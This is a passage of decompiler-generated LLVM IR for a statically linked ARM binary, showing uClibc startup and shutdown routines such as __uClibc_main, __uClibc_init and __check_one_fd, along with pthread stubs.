  store i1 %v3_14d4c, i1* %cpsr_c.global-to-local, align 1
  %v9_14d4c = icmp eq i32 %v1_14d50, %v1_14d4c
  br i1 %v9_14d4c, label %dec_label_pc_14d58, label %bb

bb:                                               ; preds = %dec_label_pc_14d4c
  store i32 %v1_14d50, i32* %r6.global-to-local, align 4
  %v1_14d10 = or i32 %v1_14d50, 2
  store i32 %v1_14d10, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_14d14 = icmp eq i32 %v1_14d10, %v1_14d50
  br i1 %v9_14d14, label %dec_label_pc_14dc0, label %bb.dec_label_pc_14d1c_crit_edge

bb.dec_label_pc_14d1c_crit_edge:                  ; preds = %bb
  %v0_14d20.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_14d1c

dec_label_pc_14d58:                               ; preds = %dec_label_pc_14d4c
  %v0_14d58 = load i32, i32* %r5.global-to-local, align 4
  %v1_14d58 = and i32 %v0_14d58, -69
  store i32 %v1_14d58, i32* @r3, align 4
  %v2_14d5c = icmp ugt i32 %v1_14d58, 9
  store i1 %v2_14d5c, i1* %cpsr_c.global-to-local, align 1
  %v7_14d5c = icmp eq i32 %v1_14d58, 10
  br i1 %v7_14d5c, label %dec_label_pc_14d64, label %dec_label_pc_14dc0

dec_label_pc_14d64:                               ; preds = %dec_label_pc_14d58
  %v1_14d68 = load i32, i32* %r7.global-to-local, align 4
  %v2_14d68 = add i32 %v1_14d68, 544
  %v3_14d68 = inttoptr i32 %v2_14d68 to i32*
  store i32 -1, i32* %v3_14d68, align 4
  %v0_14d6c = load i32, i32* @r2, align 4
  store i32 %v0_14d6c, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_14d70

dec_label_pc_14d70:                               ; preds = %dec_label_pc_14da4.dec_label_pc_14d70_crit_edge, %dec_label_pc_14d64
  %v0_14d74 = phi i32 [ %v0_14d74.pre, %dec_label_pc_14da4.dec_label_pc_14d70_crit_edge ], [ %v0_14d6c, %dec_label_pc_14d64 ]
  %v0_14d70 = load i32, i32* %r7.global-to-local, align 4
  %v1_14d70 = add i32 %v0_14d70, 132
  %v2_14d70 = inttoptr i32 %v1_14d70 to i32*
  %v3_14d70 = load i32, i32* %v2_14d70, align 4
  store i32 %v0_14d74, i32* @r2, align 4
  store i32 %v3_14d70, i32* %r4.global-to-local, align 4
  %v1_14d7c = or i32 %v3_14d70, 16
  store i32 %v1_14d7c, i32* @r1, align 4
  %v1_14d8022 = inttoptr i32 %v0_14d74 to i32*
  %v2_14d8023 = load i32, i32* %v1_14d8022, align 4
  %v3_14d8425 = icmp uge i32 %v2_14d8023, %v3_14d70
  store i1 %v3_14d8425, i1* %cpsr_c.global-to-local, align 1
  %v9_14d8431 = icmp eq i32 %v2_14d8023, %v3_14d70
  br i1 %v9_14d8431, label %dec_label_pc_14d8c, label %dec_label_pc_14da4

dec_label_pc_14d8c:                               ; preds = %dec_label_pc_14d70, %dec_label_pc_14d8c.dec_label_pc_14d80_crit_edge
  call void @__pseudo_branch(i32 -61504)
  %v0_14d9c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_14d9c, label %dec_label_pc_14da0, label %dec_label_pc_14d8c.dec_label_pc_14d80_crit_edge

dec_label_pc_14d8c.dec_label_pc_14d80_crit_edge:  ; preds = %dec_label_pc_14d8c
  %v0_14d80.pre = load i32, i32* @r2, align 4
  %v1_14d84.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_14d80 = inttoptr i32 %v0_14d80.pre to i32*
  %v2_14d80 = load i32, i32* %v1_14d80, align 4
  %v3_14d84 = icmp uge i32 %v2_14d80, %v1_14d84.pre
  store i1 %v3_14d84, i1* %cpsr_c.global-to-local, align 1
  %v9_14d84 = icmp eq i32 %v2_14d80, %v1_14d84.pre
  br i1 %v9_14d84, label %dec_label_pc_14d8c, label %dec_label_pc_14da4

dec_label_pc_14da0:                               ; preds = %dec_label_pc_14d8c
  %v0_14da0 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14da4

dec_label_pc_14da4:                               ; preds = %dec_label_pc_14d70, %dec_label_pc_14d8c.dec_label_pc_14d80_crit_edge, %dec_label_pc_14da0
  %v0_14da4 = phi i32 [ %v0_14da0, %dec_label_pc_14da0 ], [ %v2_14d8023, %dec_label_pc_14d70 ], [ %v2_14d80, %dec_label_pc_14d8c.dec_label_pc_14d80_crit_edge ]
  %v1_14da4 = phi i32 [ %v0_14da0, %dec_label_pc_14da0 ], [ %v3_14d70, %dec_label_pc_14d70 ], [ %v1_14d84.pre, %dec_label_pc_14d8c.dec_label_pc_14d80_crit_edge ]
  %v3_14da4 = icmp uge i32 %v0_14da4, %v1_14da4
  store i1 %v3_14da4, i1* %cpsr_c.global-to-local, align 1
  %v9_14da4 = icmp eq i32 %v0_14da4, %v1_14da4
  br i1 %v9_14da4, label %dec_label_pc_14dac, label %dec_label_pc_14da4.dec_label_pc_14d70_crit_edge

dec_label_pc_14da4.dec_label_pc_14d70_crit_edge:  ; preds = %dec_label_pc_14da4
  %v0_14d74.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_14d70

dec_label_pc_14dac:                               ; preds = %dec_label_pc_14da4
  store i32 116, i32* @r3, align 4
  %v0_14db4 = load i32, i32* %r8.global-to-local, align 4
  %v2_14db4 = add i32 %v0_14db4, 116
  %v3_14db4 = inttoptr i32 %v2_14db4 to i32*
  %v4_14db4 = load i32, i32* %v3_14db4, align 4
  store i32 %v4_14db4, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_14db4)
  %v0_14dc0.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14dc0

dec_label_pc_14dc0:                               ; preds = %entry, %bb, %dec_label_pc_14d58, %dec_label_pc_14dac
  %v0_14dc0 = phi i32 [ %v1_14d50, %dec_label_pc_14d58 ], [ %v0_14dc0.pre, %dec_label_pc_14dac ], [ %v3_14d04, %entry ], [ %v1_14d50, %bb ]
  %v2_14dc4 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_14dc4, i32* @r4, align 4
  ret i32 %v0_14dc0

; uselistorder directives
  uselistorder i32 %v0_14da0, { 1, 0 }
  uselistorder i32 %v1_14d84.pre, { 0, 2, 1 }
  uselistorder i32 %v1_14d10, { 1, 2, 0 }
  uselistorder i32 %v1_14d4c, { 1, 0 }
  uselistorder i32 %v1_14d50, { 0, 1, 4, 3, 5, 6, 7, 2 }
  uselistorder i32 %v1_14d2c.pre, { 1, 0 }
  uselistorder i32 %v0_14d2450, { 2, 1, 0 }
  uselistorder i32* %r7.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i1* %cpsr_c.global-to-local, { 3, 5, 4, 0, 6, 10, 7, 9, 8, 1, 2 }
  uselistorder i32 -1036, { 1, 2, 0 }
  uselistorder label %dec_label_pc_14dc0, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_14da4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14d8c, { 1, 0 }
  uselistorder label %dec_label_pc_14d4c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14d34, { 1, 0 }
  uselistorder label %dec_label_pc_14d1c, { 1, 0 }
}

define i32 @__pthread_return_0() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_mutex_init() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @_pthread_cleanup_push_defer(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %arg2, i32* %arg1, align 4
  %v3_14de4 = add i32 %tmp, 4
  %v4_14de4 = inttoptr i32 %v3_14de4 to i32*
  store i32 %arg3, i32* %v4_14de4, align 4
  ret i32 %tmp
}

define i32 @_pthread_cleanup_pop_restore(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_14df0 = icmp eq i32 %arg2, 0
  br i1 %v2_14df0, label %.thread1, label %bb

bb:                                               ; preds = %entry
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  %v3_14e08 = call i32 @__libc_errno()
  ret i32 %v3_14e08

; uselistorder directives
  uselistorder i32 ()* @__libc_errno, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__GI___uClibc_fini() local_unnamed_addr {
dec_label_pc_14e3c.lr.ph:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_14e18 = load i32, i32* @r4, align 4
  store i32 %v3_14e18, i32* %stack_var_-16, align 4
  store i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32* %r5.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 -8), i32* %r6.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14e3c

dec_label_pc_14e3c:                               ; preds = %dec_label_pc_14e3c.dec_label_pc_14e3c_crit_edge, %dec_label_pc_14e3c.lr.ph
  %v1_14e3c = phi i32 [ %v1_14e48, %dec_label_pc_14e3c.dec_label_pc_14e3c_crit_edge ], [ 0, %dec_label_pc_14e3c.lr.ph ]
  %v0_14e3c = phi i32 [ %v0_14e3c.pre, %dec_label_pc_14e3c.dec_label_pc_14e3c_crit_edge ], [ add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 -8), %dec_label_pc_14e3c.lr.ph ]
  %v4_14e3c = mul i32 %v1_14e3c, 4
  %v5_14e3c = add i32 %v4_14e3c, %v0_14e3c
  %v6_14e3c = inttoptr i32 %v5_14e3c to i32*
  %v7_14e3c = load i32, i32* %v6_14e3c, align 4
  call void @__pseudo_branch(i32 %v7_14e3c)
  %v0_14e48 = load i32, i32* %r4.global-to-local, align 4
  %v1_14e48 = add i32 %v0_14e48, -1
  store i32 %v1_14e48, i32* %r4.global-to-local, align 4
  %v2_14e48 = icmp eq i32 %v0_14e48, 0
  br i1 %v2_14e48, label %dec_label_pc_14e50, label %dec_label_pc_14e3c.dec_label_pc_14e3c_crit_edge

dec_label_pc_14e3c.dec_label_pc_14e3c_crit_edge:  ; preds = %dec_label_pc_14e3c
  %v0_14e3c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14e3c

dec_label_pc_14e50:                               ; preds = %dec_label_pc_14e3c
  %v0_14e54.pre = load i32, i32* %r5.global-to-local, align 4
  %v2_14e54 = add i32 %v0_14e54.pre, 2004
  %v3_14e54 = inttoptr i32 %v2_14e54 to i32*
  %v4_14e54 = load i32, i32* %v3_14e54, align 4
  %v2_14e58 = icmp eq i32 %v4_14e54, 0
  br i1 %v2_14e58, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_14e50
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_14e50, %bb
  %v2_14e60 = xor i1 %v2_14e58, true
  call void @__pseudo_cond_branch(i1 %v2_14e60, i32 %v4_14e54)
  %v0_14e68 = load i32, i32* %r5.global-to-local, align 4
  %v2_14e68 = add i32 %v0_14e68, 2008
  %v3_14e68 = inttoptr i32 %v2_14e68 to i32*
  %v4_14e68 = load i32, i32* %v3_14e68, align 4
  %v2_14e6c = icmp eq i32 %v4_14e68, 0
  br i1 %v2_14e6c, label %bb19, label %bb18

bb18:                                             ; preds = %bb17
  br label %bb19

bb19:                                             ; preds = %bb17, %bb18
  %v2_14e74 = xor i1 %v2_14e6c, true
  call void @__pseudo_cond_branch(i1 %v2_14e74, i32 %v4_14e68)
  %v2_14e78 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_14e78, i32* %r4.global-to-local, align 4
  %v1_14e7c = load i32, i32* @r0, align 4
  ret i32 %v1_14e7c

; uselistorder directives
  uselistorder i32 %v1_14e48, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 1, 3, 2, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__check_one_fd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_14e94 = load i32, i32* @r4, align 4
  %v6_14e94 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  %v2_14ea8 = call i32 @__libc_fcntl(i32 %arg1, i32 1)
  %v3_14eb0 = icmp eq i32 %v2_14ea8, -1
  store i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32* @r3, align 4
  br i1 %v3_14eb0, label %dec_label_pc_14ebc, label %dec_label_pc_14ed4

dec_label_pc_14ebc:                               ; preds = %entry
  %v0_14ec0 = load i32, i32* @r5, align 4
  %v2_14ec8 = call i32 @__libc_open(i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 -33916), i32 %v0_14ec0)
  %v1_14ecc = load i32, i32* @r4, align 4
  %v1_14ed0 = icmp ne i32 %v2_14ec8, %v1_14ecc
  call void @__pseudo_cond_branch(i1 %v1_14ed0, i32 ptrtoint (i32* @global_var_137f8.550 to i32))
  br label %dec_label_pc_14ed4

dec_label_pc_14ed4:                               ; preds = %entry, %dec_label_pc_14ebc
  %v1_14edc = phi i32 [ %v2_14ea8, %entry ], [ %v2_14ec8, %dec_label_pc_14ebc ]
  store i32 %v3_14e94, i32* @r4, align 4
  store i32 %v6_14e94, i32* @r5, align 4
  ret i32 %v1_14edc

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_14ed4, { 1, 0 }
}

define i32 @__GI___uClibc_init(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14ee8 = load i32, i32* @r4, align 4
  store i32 %v3_14ee8, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32* %r4.global-to-local, align 4
  %v4_14ef8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 148) to i32*), align 4
  %v1_14efc = inttoptr i32 %v4_14ef8 to i32*
  %v2_14efc = load i32, i32* %v1_14efc, align 4
  %v2_14f00 = icmp eq i32 %v2_14efc, 0
  br i1 %v2_14f00, label %dec_label_pc_14f08, label %dec_label_pc_14f2c

dec_label_pc_14f08:                               ; preds = %entry
  store i32 4096, i32* %v1_14efc, align 4
  %v0_14f10 = call i32 @__pthread_initialize_minimal()
  %v0_14f18 = load i32, i32* %r4.global-to-local, align 4
  %v2_14f18 = add i32 %v0_14f18, -47904
  %v2_14f20 = icmp eq i32 %v2_14f18, 0
  br i1 %v2_14f20, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_14f08
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_14f08, %bb
  %v2_14f28 = xor i1 %v2_14f20, true
  call void @__pseudo_cond_branch(i1 %v2_14f28, i32 %v2_14f18)
  %v2_14f2c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_14f2c

dec_label_pc_14f2c:                               ; preds = %entry, %bb4
  %v2_14f2c = phi i32 [ %v2_14f2c.pre, %bb4 ], [ %v3_14ee8, %entry ]
  %.0 = phi i32 [ %v0_14f10, %bb4 ], [ undef, %entry ]
  store i32 %v2_14f2c, i32* %r4.global-to-local, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder label %dec_label_pc_14f2c, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp62 = call i32 @__decompiler_undefined_function_0()
  %tmp63 = call i32 @__decompiler_undefined_function_0()
  %tmp64 = call i32 @__decompiler_undefined_function_0()
  %tmp65 = call i32 @__decompiler_undefined_function_0()
  %tmp66 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-400 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-416 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_d274.555 to i32), i32* %r4.global-to-local, align 4
  %v1_14f4c = add i32 %tmp, 4
  store i32 %v1_14f4c, i32* %ip.global-to-local, align 4
  %v2_14f50 = load i32, i32* %arg3, align 4
  store i32 24, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32* %r4.global-to-local, align 4
  %v3_14f5c = mul i32 %arg2, 4
  store i32 %v3_14f5c, i32* @r7, align 4
  %v4_14f64 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 24) to i32*), align 4
  store i32 %v4_14f64, i32* %r1.global-to-local, align 4
  store i32 56, i32* %r2.global-to-local, align 4
  %v2_14f6c = add i32 %v1_14f4c, %v3_14f5c
  store i32 %v2_14f6c, i32* %ip.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32* %stack_var_-416, align 4
  %v4_14f74 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 56) to i32*), align 4
  store i32 %v4_14f74, i32* %r4.global-to-local, align 4
  %v3_14f78 = icmp uge i32 %v2_14f6c, %v2_14f50
  store i1 %v3_14f78, i1* %cpsr_c.global-to-local, align 1
  %v9_14f78 = icmp eq i32 %v2_14f6c, %v2_14f50
  store i1 %v9_14f78, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg7, i32* %r2.global-to-local, align 4
  %v2_14f80 = inttoptr i32 %v4_14f74 to i32*
  store i32 %v2_14f6c, i32* %v2_14f80, align 4
  br i1 %v9_14f78, label %bb, label %bb75

bb:                                               ; preds = %entry
  store i32 %tmp, i32* %ip.global-to-local, align 4
  br label %bb75

bb75:                                             ; preds = %entry, %bb
  %v0_14f88 = load i32, i32* %r2.global-to-local, align 4
  %v1_14f88 = load i32, i32* %r1.global-to-local, align 4
  %v2_14f88 = inttoptr i32 %v1_14f88 to i32*
  store i32 %v0_14f88, i32* %v2_14f88, align 4
  %v2_14f8c = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_14f8c, i32* %r5.global-to-local, align 4
  store i32 %arg6, i32* %r1.global-to-local, align 4
  store i32 2008, i32* %r2.global-to-local, align 4
  %v0_14f98 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_14f98, i32* @r6, align 4
  br i1 %v9_14f78, label %bb76, label %.thread52

.thread52:                                        ; preds = %bb75
  %v3_14fa053 = add i32 %v2_14f8c, 2008
  %v4_14fa054 = inttoptr i32 %v3_14fa053 to i32*
  store i32 %arg6, i32* %v4_14fa054, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %bb77

bb76:                                             ; preds = %bb75
  %v1_14f9c = load i32, i32* %ip.global-to-local, align 4
  %v2_14f9c = load i32, i32* @r7, align 4
  %v3_14f9c = add i32 %v2_14f9c, %v1_14f9c
  store i32 %v3_14f9c, i32* %r3.global-to-local, align 4
  %v3_14fa050 = add i32 %v2_14f8c, 2008
  %v4_14fa051 = inttoptr i32 %v3_14fa050 to i32*
  store i32 %arg6, i32* %v4_14fa051, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v1_14fac = load i32, i32* %r3.global-to-local, align 4
  %v2_14fac = load i32, i32* %r4.global-to-local, align 4
  %v3_14fac = inttoptr i32 %v2_14fac to i32*
  store i32 %v1_14fac, i32* %v3_14fac, align 4
  br label %bb77

bb77:                                             ; preds = %.thread52, %bb76
  %v2_14fb0 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_14fb0, i32* %r0.global-to-local, align 4
  store i32 120, i32* %r2.global-to-local, align 4
  %v3_14fb8 = bitcast i32* %stack_var_-120 to i8*
  %v4_14fb8 = call i32 @__GI_memset(i8* %v3_14fb8, i32 0, i32 120)
  store i32 %v4_14fb8, i32* %r0.global-to-local, align 4
  %v0_14fbc = load i32, i32* %r4.global-to-local, align 4
  %v1_14fbc = inttoptr i32 %v0_14fbc to i32*
  %v2_14fbc = load i32, i32* %v1_14fbc, align 4
  br label %dec_label_pc_14fc8

dec_label_pc_14fc8:                               ; preds = %dec_label_pc_14fc8, %bb77
  %storemerge = phi i32 [ %v2_14fbc, %bb77 ], [ %v1_14fd4, %dec_label_pc_14fc8 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  %v1_14fc8 = inttoptr i32 %storemerge to i32*
  %v2_14fc8 = load i32, i32* %v1_14fc8, align 4
  store i32 %v2_14fc8, i32* %r3.global-to-local, align 4
  %v2_14fcc = icmp eq i32 %v2_14fc8, 0
  %v1_14fd4 = add i32 %storemerge, 4
  br i1 %v2_14fcc, label %dec_label_pc_14fd4, label %dec_label_pc_14fc8

dec_label_pc_14fd4:                               ; preds = %dec_label_pc_14fc8
  store i32 %v1_14fd4, i32* @r4, align 4
  store i32 %v2_14fb0, i32* @r5, align 4
  %v1_14ff830 = inttoptr i32 %v1_14fd4 to i32*
  %v2_14ff831 = load i32, i32* %v1_14ff830, align 4
  store i32 %v2_14ff831, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14ffc33 = icmp eq i32 %v2_14ff831, 0
  store i1 %v2_14ffc33, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14ffc33, label %dec_label_pc_15004, label %dec_label_pc_14fe0

dec_label_pc_14fe0:                               ; preds = %dec_label_pc_14fd4, %dec_label_pc_14ff8
  %v4_14fe8 = phi i32 [ %v1_14ff4, %dec_label_pc_14ff8 ], [ %v1_14fd4, %dec_label_pc_14fd4 ]
  %v5_14fe4 = phi i32 [ %v2_14ff8, %dec_label_pc_14ff8 ], [ %v2_14ff831, %dec_label_pc_14fd4 ]
  %v2_14fe0 = icmp ugt i32 %v5_14fe4, 13
  store i1 %v2_14fe0, i1* %cpsr_c.global-to-local, align 1
  %v7_14fe0 = icmp eq i32 %v5_14fe4, 14
  store i1 %v7_14fe0, i1* %cpsr_z.global-to-local, align 1
  %v2_14fe4 = xor i1 %v2_14fe0, true
  %v3_14fe4 = or i1 %v7_14fe0, %v2_14fe4
  br i1 %v3_14fe4, label %bb78, label %bb79

bb78:                                             ; preds = %dec_label_pc_14fe0
  %v4_14fe4 = load i32, i32* @r5, align 4
  %v6_14fe4 = and i32 %v5_14fe4, 536870912
  %v7_14fe4 = icmp ne i32 %v6_14fe4, 0
  store i1 %v7_14fe4, i1* %cpsr_c.global-to-local, align 1
  %v8_14fe4 = mul i32 %v5_14fe4, 8
  %v9_14fe4 = add i32 %v4_14fe4, %v8_14fe4
  store i32 %v9_14fe4, i32* %r0.global-to-local, align 4
  br label %bb79

bb79:                                             ; preds = %dec_label_pc_14fe0, %bb78
  %v1_14ff0 = phi i1 [ %v2_14fe0, %dec_label_pc_14fe0 ], [ %v7_14fe4, %bb78 ]
  %v2_14fe8 = xor i1 %v1_14ff0, true
  %v3_14fe8 = or i1 %v7_14fe0, %v2_14fe8
  br i1 %v3_14fe8, label %bb80, label %dec_label_pc_14ff8

bb80:                                             ; preds = %bb79
  store i32 %v4_14fe8, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14ff8

dec_label_pc_14ff8:                               ; preds = %bb79, %bb80
  call void @__pseudo_cond_branch(i1 %v3_14fe8, i32 ptrtoint (i32* @global_var_11bb0.559 to i32))
  %v0_14ff4 = load i32, i32* @r4, align 4
  %v1_14ff4 = add i32 %v0_14ff4, 8
  store i32 %v1_14ff4, i32* @r4, align 4
  %v1_14ff8 = inttoptr i32 %v1_14ff4 to i32*
  %v2_14ff8 = load i32, i32* %v1_14ff8, align 4
  store i32 %v2_14ff8, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14ffc = icmp eq i32 %v2_14ff8, 0
  store i1 %v2_14ffc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14ffc, label %dec_label_pc_15004, label %dec_label_pc_14fe0

dec_label_pc_15004:                               ; preds = %dec_label_pc_14ff8, %dec_label_pc_14fd4
  store i32 %v2_14fb0, i32* %r0.global-to-local, align 4
  %v1_15008 = call i32 @_dl_aux_init(i32 %v2_14fb0)
  store i32 %v1_15008, i32* %r0.global-to-local, align 4
  %v1_1500c = call i32 @__GI___uClibc_init(i32 %v1_15008)
  store i32 %v1_1500c, i32* @r0, align 4
  store i32 148, i32* %r3.global-to-local, align 4
  %v2_15014 = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_15014, i32* @lr, align 4
  store i32 %tmp66, i32* @r2, align 4
  %v2_1501c = add i32 %v2_15014, 148
  %v3_1501c = inttoptr i32 %v2_1501c to i32*
  %v4_1501c = load i32, i32* %v3_1501c, align 4
  store i32 %v4_1501c, i32* %r1.global-to-local, align 4
  store i32 %tmp65, i32* @r3, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15024 = icmp eq i32 %tmp66, 0
  store i1 %v2_15024, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15024, label %bb81, label %bb82

bb81:                                             ; preds = %dec_label_pc_15004
  store i32 4096, i32* @r2, align 4
  br label %bb82

bb82:                                             ; preds = %dec_label_pc_15004, %bb81
  %v0_15030 = phi i32 [ %tmp66, %dec_label_pc_15004 ], [ 4096, %bb81 ]
  %v3_1502c = icmp eq i32 %tmp65, -1
  store i1 %v3_1502c, i1* %cpsr_c.global-to-local, align 1
  %v8_1502c = icmp eq i32 %tmp65, -1
  store i1 %v8_1502c, i1* %cpsr_z.global-to-local, align 1
  %v2_15030 = inttoptr i32 %v4_1501c to i32*
  store i32 %v0_15030, i32* %v2_15030, align 4
  br i1 %v3_1502c, label %dec_label_pc_15038, label %dec_label_pc_15060

dec_label_pc_15038:                               ; preds = %bb82
  %v0_15038 = call i32 @getuid()
  store i32 %v0_15038, i32* @r0, align 4
  store i32 %v0_15038, i32* %r4.global-to-local, align 4
  %v0_15040 = call i32 @geteuid()
  store i32 %v0_15040, i32* @r0, align 4
  %v3_15044 = icmp uge i32 %v0_15038, %v0_15040
  store i1 %v3_15044, i1* %cpsr_c.global-to-local, align 1
  %v9_15044 = icmp eq i32 %v0_15038, %v0_15040
  store i1 %v9_15044, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15044, label %dec_label_pc_1504c, label %dec_label_pc_15088

dec_label_pc_1504c:                               ; preds = %dec_label_pc_15038
  %v1_1504c = call i32 @getgid(i32 %v0_15040)
  store i32 %v1_1504c, i32* @r0, align 4
  store i32 %v1_1504c, i32* %r4.global-to-local, align 4
  %v0_15054 = call i32 @getegid()
  store i32 %v0_15054, i32* %r0.global-to-local, align 4
  %v3_15058 = icmp uge i32 %v1_1504c, %v0_15054
  store i1 %v3_15058, i1* %cpsr_c.global-to-local, align 1
  %v9_15058 = icmp eq i32 %v1_1504c, %v0_15054
  store i1 %v9_15058, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15058, label %dec_label_pc_15060, label %dec_label_pc_15088

dec_label_pc_15060:                               ; preds = %dec_label_pc_1504c, %bb82
  store i32 %tmp65, i32* @r2, align 4
  store i1 %v3_1502c, i1* %cpsr_c.global-to-local, align 1
  store i1 %v8_1502c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_1502c, label %dec_label_pc_150b0, label %dec_label_pc_1506c

dec_label_pc_1506c:                               ; preds = %dec_label_pc_15060
  store i32 %tmp64, i32* @r3, align 4
  %v3_15070 = icmp uge i32 %tmp65, %tmp64
  store i1 %v3_15070, i1* %cpsr_c.global-to-local, align 1
  %v9_15070 = icmp eq i32 %tmp65, %tmp64
  store i1 %v9_15070, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15070, label %dec_label_pc_15078, label %dec_label_pc_15088

dec_label_pc_15078:                               ; preds = %dec_label_pc_1506c
  store i32 %tmp63, i32* @r2, align 4
  store i32 %tmp62, i32* @r3, align 4
  %v3_15080 = icmp uge i32 %tmp63, %tmp62
  store i1 %v3_15080, i1* %cpsr_c.global-to-local, align 1
  %v9_15080 = icmp eq i32 %tmp63, %tmp62
  store i1 %v9_15080, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15080, label %dec_label_pc_150b0, label %dec_label_pc_15088

dec_label_pc_15088:                               ; preds = %dec_label_pc_1506c, %dec_label_pc_1504c, %dec_label_pc_15038, %dec_label_pc_15078
  store i32 32770, i32* @r4, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 32768, i32* %r1.global-to-local, align 4
  %v2_15094 = call i32 @__check_one_fd(i32 0, i32 32768)
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_1509c = load i32, i32* @r4, align 4
  store i32 %v0_1509c, i32* %r1.global-to-local, align 4
  %v2_150a0 = call i32 @__check_one_fd(i32 1, i32 %v0_1509c)
